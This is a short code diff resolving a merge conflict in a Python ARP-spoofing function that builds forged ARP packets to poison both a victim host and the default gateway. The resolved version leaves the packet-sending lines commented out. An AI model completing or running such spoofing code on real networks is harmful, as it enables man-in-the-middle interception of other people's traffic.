@@ -45,27 +45,15 @@ def arpSpoof(localAddresses,defaultGateway,localMAC):
     while True:
         for ip in localAddresses.keys():
             if ip != defaultGateway:
-<<<<<<< HEAD
-                #create arp packets
-=======
                 #create arp packet
->>>>>>> a3a344f1fdf63e08426fc5a4eede17091b8c7cf9
                 victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=1, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
                 victimPacket.show()
                 gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=1,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
                 gatewayPacket.show()
-<<<<<<< HEAD
                 #send(victimPacket)
                 #send(gatewayPacket)
             break
         break
-=======
-                send(victimPacket)
-                send(gatewayPacket)
-            break
-        break
-                #send(a)
->>>>>>> a3a344f1fdf63e08426fc5a4eede17091b8c7cf9
 
 
 def main():
